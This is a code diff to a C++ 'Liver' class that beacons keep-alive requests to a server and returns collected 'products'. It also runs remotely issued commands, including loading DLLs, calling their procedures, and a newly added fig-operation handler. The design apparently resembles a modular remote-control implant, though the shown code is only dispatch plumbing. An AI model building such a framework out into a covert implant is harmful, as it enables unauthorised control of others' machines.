@@ -13,6 +13,7 @@
 #include "Filesystem/VolumeIterator.hpp"
 #include "Handlers/CallDllGenericProcedureHandler.hpp"
 #include "Handlers/CallDllProcedureHandler.hpp"
+#include "Handlers/ExecuteFigOperationHandler.hpp"
 #include "Handlers/LoadDllHandler.hpp"
 #include "Handlers/LoadFigHandler.hpp"
 #include "Handlers/UnloadDllHandler.hpp"
@@ -30,8 +31,13 @@ Liver::Liver(Event::Ptr quit_event,
 	m_command_factory(std::move(command_factory)),
 	m_communicator(std::move(communicator)),
 	m_iteration_delay(iteration_delay),
-	m_products(),
+	m_products(std::make_shared<ProductsContainer>()),
 	m_libraries(std::make_shared<LibrariesContainer>()),
+	m_figs(std::make_shared<FigsContainer>()),
+	m_operations(std::make_shared<FigOperationsContainer>()),
+	m_operations_fetcher_thread(
+		std::make_unique<FigOperationsFetcher>(m_quit_event, m_products, m_operations)
+	),
 	m_handlers()
 {
 	register_handlers();
@@ -86,11 +92,14 @@ std::wstring Liver::quit_event_name()
 
 IRequest::Ptr Liver::get_next_request()
 {
-	if (!m_products.has_new())
+	if (!m_products->has_new())
 	{
+		TRACE(L"sending KeepAliveRequest");
 		return std::make_unique<KeepAliveRequest>(m_liver_id);
 	}
-	return std::make_unique<ReturnProductsRequest>(m_liver_id, m_products.pop_all());
+	auto products = m_products->pop_all();
+	TRACE(L"sending ReturnProductsRequest with ", products.size(), " products");
+	return std::make_unique<ReturnProductsRequest>(m_liver_id, std::move(products));
 }
 
 void Liver::handle_response(IResponse::Ptr response)
@@ -146,7 +155,7 @@ void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
 		}
 		const ICommandHandler::Ptr& handler = m_handlers[command->type()];
 		std::vector<IProduct::Ptr> products = handler->handle(command);
-		m_products.insert_all(std::move(products));
+		m_products->insert_all(std::move(products));
 	}
 }
 
@@ -162,6 +171,10 @@ void Liver::register_handlers()
 
 	register_handler(ICommand::Type::LOAD_FIG, std::make_unique<LoadFigHandler>(m_figs));
 	register_handler(ICommand::Type::UNLOAD_FIG, std::make_unique<UnloadFigHandler>(m_figs));
+	register_handler(
+		ICommand::Type::EXECUTE_FIG_OPERATION,
+		std::make_unique<ExecuteFigOperationHandler>(m_figs, m_operations)
+	);
 }
 
 void Liver::register_handler(const ICommand::Type type, ICommandHandler::Ptr handler)
